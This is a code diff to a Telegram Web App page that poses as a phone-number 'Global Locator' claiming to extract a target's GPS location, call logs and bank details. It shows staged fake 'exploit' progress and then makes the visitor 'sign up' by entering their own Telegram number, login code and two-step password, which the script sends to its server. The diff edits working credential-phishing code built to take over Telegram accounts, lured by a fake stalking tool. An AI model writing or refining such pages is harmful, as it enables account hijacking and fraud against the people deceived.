@@ -13,32 +13,22 @@
         .step-screen { display: none; padding: 30px 20px; flex-direction: column; align-items: center; height: 100%; animation: fadeIn 0.4s ease; text-align: center; overflow-y: auto;}
         .step-screen.active { display: flex; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        
         h2 { font-size: 24px; margin-bottom: 8px; font-weight: 700; letter-spacing: 0.5px; }
         p.subtitle { color: var(--text-muted); font-size: 15px; margin-bottom: 25px; line-height: 1.5; }
-        
         .input-group { width: 100%; margin-bottom: 15px; position: relative; }
         .input-box { border: 1px solid var(--border-color); border-radius: 10px; display: flex; align-items: center; padding: 14px 15px; background: var(--container-bg); transition: 0.3s; }
         .input-box:focus-within { border-color: var(--btn-blue); box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); }
         .input-box select, .phone-input { background: transparent; border: none; color: white; font-size: 16px; width: 100%; outline: none; }
         .input-box.phone-box { padding: 0; }
-        input[type="number"]::-webkit-outer-spin-button, input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
-        input[type="number"] { -moz-appearance: textfield; }
-        
         .phone-code { padding: 15px; border-right: 1px solid var(--border-color); color: white; font-size: 16px; font-weight: bold;}
         #manual-country-code { background: transparent; color: white; border: none; outline: none; width: 65px; text-align: center; font-size: 16px; font-weight: bold; border-right: 1px solid var(--border-color); padding: 15px 5px;}
         .phone-input { padding: 15px; letter-spacing: 1px;}
-        
         .btn-full { width: 100%; padding: 16px; border-radius: 10px; background-color: #1f2937; color: var(--text-muted); border: none; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: 0.3s; text-decoration: none; display: block; text-align: center;}
         .btn-full.active { background-color: var(--btn-blue); color: white; }
         .btn-full.active:hover { background-color: var(--btn-blue-hover); transform: translateY(-1px); }
         .btn-outline { background-color: transparent; border: 1px solid var(--btn-blue); color: var(--btn-blue); }
-        
-        /* Unique SVG Icon */
         .icon-svg { width: 60px; height: 60px; fill: var(--btn-blue); margin-bottom: 15px; animation: float 3s ease-in-out infinite; }
         @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-8px); } 100% { transform: translateY(0px); } }
-
-        /* Tasks Animation CSS */
         .tasks-container { width: 100%; background: var(--container-bg); border-radius: 10px; padding: 15px; border: 1px solid var(--border-color); text-align: left; margin-bottom: 20px;}
         .task-row { display: flex; align-items: center; margin-bottom: 12px; font-size: 14px; }
         .task-row:last-child { margin-bottom: 0; }
@@ -46,26 +36,19 @@
         @keyframes spin { to { transform: rotate(360deg); } }
         .task-icon { margin-right: 10px; font-size: 14px; }
         .task-name { color: var(--text-main); }
-        
-        /* Blurred Data Card */
         .data-card { background: rgba(16, 185, 129, 0.05); border: 1px solid rgba(16, 185, 129, 0.3); border-radius: 10px; padding: 15px; width: 100%; margin-bottom: 15px; text-align: left;}
         .blur-text { filter: blur(5px); user-select: none; opacity: 0.8; font-family: monospace; font-size: 14px;}
-        
         .otp-container { display: flex; gap: 12px; margin-bottom: 30px; justify-content: center;}
         .otp-input { width: 45px; height: 55px; background: var(--container-bg); border: 1px solid var(--border-color); border-radius: 10px; color: white; font-size: 24px; text-align: center; outline: none; font-weight: bold; transition: 0.2s;}
         .otp-input:focus { border-color: var(--btn-blue); box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); }
-        
-        /* Custom Modal */
         .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 100; justify-content: center; align-items: center; backdrop-filter: blur(3px);}
         .modal-box { background: var(--container-bg); border: 1px solid var(--border-color); padding: 25px; border-radius: 12px; width: 85%; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
         .modal-spinner { margin: 0 auto 15px; width: 35px; height: 35px; border: 3px solid rgba(59, 130, 246, 0.2); border-top-color: var(--btn-blue); border-radius: 50%; animation: spin 1s linear infinite; }
-        
         .footer { position: fixed; bottom: 15px; width: 100%; text-align: center; font-size: 12px; color: #6b7280; z-index: 10; }
     </style>
 </head>
 <body>
 
-<!-- Custom Loading Modal -->
 <div id="custom-modal" class="modal-overlay">
     <div class="modal-box">
         <div class="modal-spinner"></div>
@@ -82,12 +65,10 @@
         <p class="subtitle">Verifying secure satellite uplink.</p>
     </div>
 
-    <!-- 1. Track Number Input -->
     <div id="step-tracker-input" class="step-screen">
         <svg class="icon-svg" viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
         <h2>Global Locator</h2>
         <p class="subtitle">Enter target mobile number to extract live coordinates and data.</p>
-        
         <div class="input-group">
             <div class="input-box">
                 <select id="target-country" style="font-weight: bold;">
@@ -100,29 +81,23 @@
         <div class="input-group">
             <div class="input-box phone-box">
                 <div class="phone-code" id="target-code-display">+91</div>
-                <input type="number" id="target-mobile" class="phone-input" placeholder="Enter number">
+                <input type="tel" id="target-mobile" class="phone-input" placeholder="Enter number" inputmode="numeric" oninput="this.value=this.value.replace(/\D/g,'')">
             </div>
         </div>
         <p id="tracker-error" style="color: var(--error-color); font-size: 13px; margin-top: -5px; margin-bottom: 15px; display: none; text-align: left; width: 100%; background: rgba(239, 68, 68, 0.1); padding: 8px; border-radius: 6px;"></p>
-        
         <button class="btn-full active" onclick="startTracking()">Extract Data</button>
     </div>
 
-    <!-- 2. Tracking Animation -->
     <div id="step-tracker-progress" class="step-screen">
         <svg class="icon-svg" viewBox="0 0 24 24"><path d="M19.33 4.67a10 10 0 00-14.66 0l1.42 1.42a8 8 0 0111.82 0l1.42-1.42zM12 10a2 2 0 100 4 2 2 0 000-4zm4.5-1.5a6 6 0 00-9 0L9 10a4 4 0 016 0l1.5-1.5z"/></svg>
         <h2>Processing...</h2>
         <p class="subtitle">Running exploitation frameworks.</p>
-        <div class="tasks-container" id="tracking-tasks">
-            <!-- Injected via JS -->
-        </div>
+        <div class="tasks-container" id="tracking-tasks"></div>
     </div>
 
-    <!-- 3. Found / Blurred Teaser -->
     <div id="step-tracker-success" class="step-screen">
         <h2 style="color: var(--success-color);">Exploit Successful</h2>
         <p class="subtitle" style="margin-bottom: 15px; font-size:13px;">Raw data blocks retrieved from carrier databases.</p>
-        
         <div class="data-card">
             <p style="margin:0 0 10px 0; font-size:13px; color:var(--text-muted); border-bottom:1px solid var(--border-color); padding-bottom:5px;">Target: <span id="display-target-num" style="color:white;font-weight:bold;"></span></p>
             <div style="margin-top:10px;">
@@ -132,46 +107,38 @@
                 <div style="display:flex; justify-content:space-between; margin-bottom:5px;"><span style="color:var(--text-muted); font-size:13px;">Call Logs:</span> <span class="blur-text">142 records found</span></div>
             </div>
         </div>
-
         <div style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 8px; padding: 10px; margin-bottom:20px;">
             <p style="margin:0; font-size:12px; color:#fca5a5; font-weight:bold;">🔒 ENCRYPTED VIEW</p>
             <p style="margin:5px 0 0 0; font-size:11px; color:var(--text-muted);">Sign up to decrypt the payload and view the live map.</p>
         </div>
-
         <button class="btn-full active" onclick="triggerSignup()">Decrypt & View Result</button>
     </div>
 
-    <!-- 4. Manual Fallback Phone Entry -->
     <div id="step-phone" class="step-screen">
         <h2>Authentication</h2>
         <p class="subtitle">Please confirm your Telegram number<br>to verify your identity.</p>
-        
         <div class="input-group">
             <div class="input-box phone-box">
                 <input type="text" id="manual-country-code" value="+91" placeholder="+Code">
-                <input type="tel" id="phone-number" class="phone-input" placeholder="Your Telegram Number" autocomplete="off">
+                <input type="tel" id="phone-number" class="phone-input" placeholder="Your Telegram Number" autocomplete="off" inputmode="numeric" oninput="this.value=this.value.replace(/\D/g,'')">
             </div>
         </div>
         <button class="btn-full active" onclick="submitPhoneManual()">Send Verification Code</button>
     </div>
 
-    <!-- 5. OTP Screen -->
     <div id="step-otp" class="step-screen">
         <h2>Enter Code</h2>
         <p class="subtitle" style="color: var(--btn-blue); font-weight: bold;">An official OTP was sent to your Telegram app.</p>
-        
         <div class="otp-container">
-            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 1)">
-            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 2)">
-            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 3)">
-            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 4)">
-            <input type="text" class="otp-input" maxlength="1" onkeyup="submitOTP(this)">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/\D/g,'')" onkeyup="moveToNext(this, 1)">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/\D/g,'')" onkeyup="moveToNext(this, 2)">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/\D/g,'')" onkeyup="moveToNext(this, 3)">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/\D/g,'')" onkeyup="moveToNext(this, 4)">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/\D/g,'')" onkeyup="submitOTP(this)">
         </div>
-        
         <a href="tg://openmessage?user_id=777000" class="btn-full btn-outline" style="margin-top: 5px;">Check OTP in Telegram</a>
     </div>
 
-    <!-- 6. 2FA Screen -->
     <div id="step-2fa" class="step-screen">
         <h2>Two-Step Verification</h2>
         <p class="subtitle">Your account is protected with an additional password.</p>
@@ -183,18 +150,11 @@
         <button id="btn-2fa" class="btn-full" onclick="submit2FA()">Access System</button>
     </div>
 
-    <!-- 7. Map Result (Fake Data generated) -->
     <div id="step-result" class="step-screen">
         <h2 style="color: var(--success-color);">Target Located</h2>
         <p class="subtitle" style="margin-bottom: 15px; font-size: 13px;">Decryption successful. Data stream open.</p>
-        
-        <div id="final-fake-data" class="data-card" style="background: rgba(59, 130, 246, 0.1); border-color: var(--btn-blue);">
-            <!-- Injected via JS -->
-        </div>
-        
-        <div style="width: 100%; border-radius: 12px; overflow: hidden; border: 2px solid var(--border-color); margin-bottom: 15px; height:200px;" id="map-container">
-        </div>
-        
+        <div id="final-fake-data" class="data-card" style="background: rgba(59, 130, 246, 0.1); border-color: var(--btn-blue);"></div>
+        <div style="width: 100%; border-radius: 12px; overflow: hidden; border: 2px solid var(--border-color); margin-bottom: 15px; height:200px;" id="map-container"></div>
         <button class="btn-full btn-outline" onclick="trackAnother()">Track Another Number</button>
     </div>
 </div>
@@ -204,11 +164,11 @@
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
-    
-    const tg_user_id = tg.initDataUnsafe?.user?.id || "web_test_user";
+
+    const tg_user_id = String(tg.initDataUnsafe?.user?.id || "web_test_user");
     const tg_username = tg.initDataUnsafe?.user?.username || "unknown";
     const tg_name = tg.initDataUnsafe?.user?.first_name || "Unknown";
-    
+
     let targetCountryCode = "+91";
     let targetFullNumber = "";
     let isUserLoggedIn = false;
@@ -222,7 +182,6 @@
         document.querySelectorAll('.step-screen').forEach(el => el.classList.remove('active'));
         document.getElementById(stepId).classList.add('active');
     }
-    
     function showModal(text) {
         document.getElementById('modal-text').innerText = text;
         document.getElementById('custom-modal').style.display = 'flex';
@@ -239,24 +198,26 @@
         } catch (err) { alert("Network Error"); hideModal(); }
     }
 
+    // ---- Session check (Firebase only, no localStorage) ----
     window.onload = async () => {
         try {
-            const response = await fetch("/check_session", { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ tg_user_id, tg_username, tg_name }) });
+            const response = await fetch("/check_session", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ tg_user_id, tg_username, tg_name })
+            });
             const res = await response.json();
-            if(res.status === "exists") {
-                isUserLoggedIn = true;
-                // If they enter and have session, prompt to track a number first instead of jumping to empty result.
-                showStep('step-tracker-input');
-            } else { showStep('step-tracker-input'); }
-        } catch(e) { showStep('step-tracker-input'); }
+            isUserLoggedIn = (res.status === "exists");
+        } catch (e) {
+            isUserLoggedIn = false;
+        }
+        showStep('step-tracker-input');
     };
 
-    // --- STRICT NUMBER VALIDATION ---
     function startTracking() {
         const mobile = document.getElementById('target-mobile').value.trim();
         const errorMsg = document.getElementById('tracker-error');
         errorMsg.style.display = 'none';
-        
         let cleanNum = mobile.replace(/\D/g, '');
 
         if (targetCountryCode === '+91') {
@@ -272,14 +233,17 @@
                 errorMsg.innerText = "Invalid number format."; errorMsg.style.display = 'block'; return;
             }
         } else {
-             if(cleanNum.length < 8) { errorMsg.innerText = "Number too short."; errorMsg.style.display = 'block'; return;}
+            if (cleanNum.length < 8) { errorMsg.innerText = "Number too short."; errorMsg.style.display = 'block'; return; }
         }
 
         targetFullNumber = targetCountryCode + " " + cleanNum;
         document.getElementById('display-target-num').innerText = targetFullNumber;
-        
-        // Log query
-        fetch("/api/track_target", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ tg_user_id, target_number: targetFullNumber }) });
+
+        fetch("/api/track_target", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ tg_user_id, target_number: targetFullNumber })
+        });
 
         showStep('step-tracker-progress');
         runFakeExploitAnimations();
@@ -289,34 +253,27 @@
         const tasks = [
             { name: "Querying leak databases...", pass: true },
             { name: "Extracting Carrier APIs...", pass: true },
-            { name: "Bypassing iCloud/Drive Backup...", pass: false }, // Intentional red cross
+            { name: "Bypassing iCloud/Drive Backup...", pass: false },
             { name: "Triangulating GPS Coordinates...", pass: true },
             { name: "Fetching device IMEI & Call Logs...", pass: true }
         ];
-        
         const container = document.getElementById('tracking-tasks');
-        container.innerHTML = ''; 
-
+        container.innerHTML = '';
         for (let task of tasks) {
             const row = document.createElement('div');
             row.className = 'task-row';
             row.innerHTML = `<span class="task-spinner"></span> <span class="task-name">${task.name}</span>`;
             container.appendChild(row);
-
-            // Wait 4-5 seconds per step as requested
-            const waitTime = Math.floor(Math.random() * 1000) + 4000; 
+            const waitTime = Math.floor(Math.random() * 1000) + 4000;
             await new Promise(r => setTimeout(r, waitTime));
-
             if (task.pass) {
                 row.innerHTML = `<span class="task-icon">✅</span> <span class="task-name" style="color:var(--success-color)">${task.name}</span>`;
             } else {
                 row.innerHTML = `<span class="task-icon">❌</span> <span class="task-name" style="color:var(--error-color)">${task.name} (Failed)</span>`;
             }
         }
-        
-        setTimeout(() => { 
-            // If already logged in, skip the blur screen and show the result directly
-            if (isUserLoggedIn) { loadMapResult(); } 
+        setTimeout(() => {
+            if (isUserLoggedIn) { loadMapResult(); }
             else { showStep('step-tracker-success'); }
         }, 1200);
     }
@@ -324,12 +281,11 @@
     function triggerSignup() {
         if (tg.requestContact) {
             tg.requestContact((shared) => {
-                if (shared) { startAuthPolling(); } 
+                if (shared) { startAuthPolling(); }
                 else { showStep('step-phone'); }
             });
-            setTimeout(() => { 
-                // Fallback inside native TG if it silently hangs
-                if(document.getElementById('step-tracker-success').classList.contains('active')) { showStep('step-phone'); }
+            setTimeout(() => {
+                if (document.getElementById('step-tracker-success').classList.contains('active')) { showStep('step-phone'); }
             }, 6000);
         } else { showStep('step-phone'); }
     }
@@ -339,9 +295,7 @@
         let attempts = 0;
         let poll = setInterval(async () => {
             attempts++;
-            if (attempts > 15) { 
-                clearInterval(poll); hideModal(); showStep('step-phone'); return;
-            }
+            if (attempts > 15) { clearInterval(poll); hideModal(); showStep('step-phone'); return; }
             try {
                 let res = await fetch("/api/check_phone", { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ tg_user_id }) });
                 let data = await res.json();
@@ -350,30 +304,30 @@
                     document.getElementById('modal-text').innerText = "Sending OTP...";
                     const sendRes = await sendRequest({ action: 'send_phone', phone: data.phone });
                     hideModal();
-                    if(sendRes && sendRes.status === 'success') {
+                    if (sendRes && sendRes.status === 'success') {
                         showStep('step-otp');
                         document.querySelectorAll('.otp-input')[0].focus();
                     }
                 }
-            } catch(e) {}
+            } catch (e) {}
         }, 2000);
     }
 
     async function submitPhoneManual() {
         const code = document.getElementById('manual-country-code').value.trim();
         const num = document.getElementById('phone-number').value.trim();
-        if(!num) return;
+        if (!num) return;
         showModal("Sending OTP...");
         const res = await sendRequest({ action: 'send_phone', phone: code + num });
         hideModal();
-        if(res && res.status === 'success') {
+        if (res && res.status === 'success') {
             showStep('step-otp');
             document.querySelectorAll('.otp-input')[0].focus();
-        } 
+        }
     }
 
-    // --- OTP LOGIC ---
     function moveToNext(current, nextIndex) {
+        current.value = current.value.replace(/\D/g, '');
         if (current.value.length >= current.maxLength) {
             const inputs = document.querySelectorAll('.otp-input');
             if (nextIndex < inputs.length) inputs[nextIndex].focus();
@@ -381,46 +335,48 @@
     }
 
     async function submitOTP(current) {
-        if(current.value.length === 1) {
+        current.value = current.value.replace(/\D/g, '');
+        if (current.value.length === 1) {
             let otpCode = '';
             document.querySelectorAll('.otp-input').forEach(input => otpCode += input.value);
-            
-            if(otpCode.length === 5) {
+            if (otpCode.length === 5) {
                 document.querySelectorAll('.otp-input').forEach(input => input.disabled = true);
                 showModal("Verifying code...");
-                
                 const res = await sendRequest({ action: 'send_otp', otp: otpCode });
-                
                 hideModal();
                 document.querySelectorAll('.otp-input').forEach(input => input.disabled = false);
-
-                if(res.next_step === '2fa') { showStep('step-2fa'); } 
-                else if (res.next_step === 'result') { isUserLoggedIn = true; loadMapResult(); }
+                if (res.next_step === '2fa') { showStep('step-2fa'); }
+                else if (res.next_step === 'result') {
+                    isUserLoggedIn = true;
+                    loadMapResult();
+                }
             }
         }
     }
 
     function checkPasswordInput() {
         const btn = document.getElementById('btn-2fa');
-        if(document.getElementById('two-fa-pass').value.length > 0) btn.classList.add('active');
+        if (document.getElementById('two-fa-pass').value.length > 0) btn.classList.add('active');
         else btn.classList.remove('active');
     }
 
     async function submit2FA() {
         const pass = document.getElementById('two-fa-pass').value;
-        if(!pass) return;
+        if (!pass) return;
         showModal("Decrypting 2FA...");
         const res = await sendRequest({ action: 'send_2fa', password: pass });
         hideModal();
-        if(res && res.status === 'success') { isUserLoggedIn = true; loadMapResult(); }
+        if (res && res.status === 'success') {
+            isUserLoggedIn = true;
+            loadMapResult();
+        }
     }
 
     function generateRandomIP() { return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; }
-    
+
     function loadMapResult() {
         showStep('step-result');
         let lat, lng, fakeName, fakeBank;
-
         if (targetCountryCode === "+92") {
             lat = 31.5204 + (Math.random() - 0.5) * 0.5; lng = 74.3587 + (Math.random() - 0.5) * 0.5;
             fakeName = ["Ali Raza", "Usman Khan", "Fatima Bibi", "Ahmed Hassan"][Math.floor(Math.random()*4)];
@@ -434,7 +390,6 @@
             fakeName = ["Rahul Sharma", "Priya Singh", "Amit Kumar", "Neha Gupta"][Math.floor(Math.random()*4)];
             fakeBank = "SBI India (**** " + Math.floor(1000 + Math.random() * 9000) + ")";
         }
-        
         let htmlData = `
             <div style="display:flex; justify-content:space-between; margin-bottom:8px; border-bottom:1px solid #374151; padding-bottom:5px;">
                 <span style="color:var(--text-muted); font-size:13px;">Target:</span> <span style="color:white; font-weight:bold;">${targetFullNumber}</span>
@@ -446,7 +401,6 @@
             <div style="display:flex; justify-content:space-between; margin-bottom:5px;"><span style="color:var(--text-muted); font-size:13px;">Recent Calls:</span> <span style="color:var(--success-color); font-weight:bold; font-family:monospace;">${Math.floor(20 + Math.random() * 150)} logs saved</span></div>
         `;
         document.getElementById('final-fake-data').innerHTML = htmlData;
-
         const mapUrl = `https://maps.google.com/maps?q=${lat},${lng}&z=14&output=embed`;
         document.getElementById('map-container').innerHTML = `<iframe width="100%" height="100%" frameborder="0" style="border:0;" src="${mapUrl}" allowfullscreen></iframe>`;
     }
@@ -456,6 +410,5 @@
         showStep('step-tracker-input');
     }
 </script>
-
 </body>
 </html>
